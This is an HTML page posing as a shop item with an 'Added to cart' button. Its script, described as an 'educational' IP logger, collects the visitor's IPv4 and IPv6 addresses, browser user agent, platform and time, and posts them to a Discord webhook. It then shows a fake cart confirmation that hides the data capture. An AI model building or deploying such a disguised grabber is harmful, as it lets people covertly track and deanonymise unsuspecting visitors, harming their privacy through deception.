<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>My Shop</title>
<style>
    body {
        background-color: #0d1b2a;
        font-family: Arial, sans-serif;
        color: white;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }
    .card {
        background-color: #1b263b;
        padding: 20px;
        border-radius: 12px;
        box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.4);
        width: 300px;
        text-align: center;
    }
    h2 {
        margin-bottom: 10px;
        color: #e0e1dd;
    }
    button {
        background-color: #415a77;
        color: white;
        padding: 10px 15px;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-size: 16px;
        transition: background-color 0.2s ease;
    }
    button:hover {
        background-color: #778da9;
    }
    .notification {
        margin-top: 15px;
        color: #90ee90;
        font-weight: bold;
        display: none;
    }
</style>
</head>
<body>

<div class="card">
    <h2>Test Item</h2>
    <p>Educational IPv4 & IPv6 Logger</p>
    <button onclick="sendIP()">Send IPv4 & IPv6</button>
    <div class="notification" id="notify">Added to cart successfully</div>
</div>

<script>
async function sendIP() {
    const webhook = "YOUR_DISCORD_WEBHOOK_HERE"; // Replace with your webhook

    try {
        // Fetch IPv4
        const ipv4Res = await fetch('https://api.ipify.org?format=json');
        const ipv4 = (await ipv4Res.json()).ip;

        // Fetch IPv6
        let ipv6 = "No IPv6 detected";
        try {
            const ipv6Res = await fetch('https://api64.ipify.org?format=json');
            ipv6 = (await ipv6Res.json()).ip;
        } catch {}

        // Browser & OS
        const browser = navigator.userAgent;
        const os = navigator.platform;
        const timestamp = new Date().toLocaleString();

        // Payload
        const payload = {
            content: `**Test IP Logger (Educational)**\nIPv4: \`${ipv4}\`\nIPv6: \`${ipv6}\`\nBrowser: \`${browser}\`\nOS: \`${os}\`\nTime: \`${timestamp}\``
        };

        // Send to webhook
        await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        // Show success notification
        document.getElementById("notify").style.display = "block";

    } catch (err) {
        console.error(err);
    }
}
</script>

</body>
</html>
